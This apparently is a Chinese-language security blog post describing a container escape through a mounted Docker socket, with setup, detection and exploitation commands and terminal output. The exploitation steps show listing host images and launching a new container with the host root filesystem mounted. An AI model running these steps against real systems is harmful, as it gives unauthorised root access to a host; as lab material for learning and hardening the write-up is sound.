---
title: Docker Socket 挂载逃逸
date: 2022-08-12 18:14:52
slug: docker-socket-mount-escape
tags:
  - Docker
  - Security
categories:
  - Security
  - Container

---

## 一、漏洞描述

在启动`docker`容器时，将宿主机`/var/run/docker.sock`文件挂载到`docker`容器中，在`docker`容器中，也可以操作宿主机的`docker`

## 二、环境搭建

```bash
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:16.04 /bin/bash
```

## 三、漏洞验证

```bash
find / -name docker.sock 
```

## 四、漏洞利用

在`docker`容器中安装`docker`，利用docker.sock 访问宿主机资源

```bash
docker -H unix://var/run/docker.sock images 
```

```bash
root@99db92ade596:/# docker -H unix://var/run/docker.sock images 
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
flaskapp-no-root    latest              191c96d54d26        25 hours ago        126MB
flaskapp-root       latest              50d72e86aa68        25 hours ago        126MB
alpine              latest              7e01a0d0a1dc        3 days ago          7.34MB
busybox             latest              a416a98b71e2        3 weeks ago         4.26MB
ubuntu              18.04               f9a80a55f492        2 months ago        63.2MB
ubuntu              16.04               b6f507652425        23 months ago       135MB
python              3.9.5-slim          c71955050276        2 years ago         115MB
```

在`docker`容器中，使用命令再运行一个`docker`容器,将宿主机的根目录挂载到`ubuntu:16.04`的`test`目录中，造成`docker`逃逸

```bash
docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash
```

```bash
root@99db92ade596:/# docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash
root@a74e00c4869d:/# ls
bin   dev  home  lib64  mnt  proc  run   srv  test  usr
boot  etc  lib   media  opt  root  sbin  sys  tmp   var

```